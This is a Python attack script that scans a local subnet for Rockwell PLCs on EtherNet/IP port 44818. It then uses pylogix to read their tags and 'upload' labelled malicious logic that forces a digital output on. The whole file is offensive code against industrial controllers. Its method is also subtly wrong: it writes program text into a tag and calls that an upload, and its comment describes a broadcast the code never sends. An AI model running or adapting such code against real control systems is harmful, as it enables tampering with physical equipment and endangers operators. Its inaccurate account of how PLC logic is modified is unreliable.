import socket
import struct
import itertools
from pylogix import PLC

# Function for IP Discovery (Assumes PLC is on local network)
def find_plc_ip():
    # Broadcasting a CIP request to discover Rockwell PLC on the local network
    for ip_suffix in range(1, 255):  # Scan typical subnet 192.168.1.x
        ip = f"192.168.1.{ip_suffix}"
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                s.connect((ip, 44818))  # EtherNet/IP uses port 44818
                return ip  # Return the first responsive IP
        except (socket.timeout, ConnectionRefusedError):
            continue
    return None

# Function to modify the execution of the PLC
def modify_plc_task(ip):
    with PLC(ip) as comm:
        # Show current tags
        tags = comm.GetTagList()
        print("Current PLC Tags:", tags.Value)

        # Modify Execution: Create a new program block or modify existing one
        new_logic = """
        VAR
            Attack_Var : BOOL := FALSE; // New malicious variable
        END_VAR

        PROGRAM AttackTask
            Attack_Var := TRUE;  // Modify PLC behavior
            _IO_EM_DO_06 := TRUE; // Turn on Red LED indicating a fault
        END_PROGRAM
        """
        
        # Upload the new logic to the PLC
        response = comm.Write("NewTask", new_logic)
        if response.Status == "Success":
            print("[+] Malicious Program Uploaded Successfully")
        else:
            print("[-] Failed to Upload the Malicious Program")

# Execute the attack
plc_ip = find_plc_ip()
if plc_ip:
    print(f"[+] PLC found at {plc_ip}")
    modify_plc_task(plc_ip)
else:
    print("[-] No PLC found on the network.")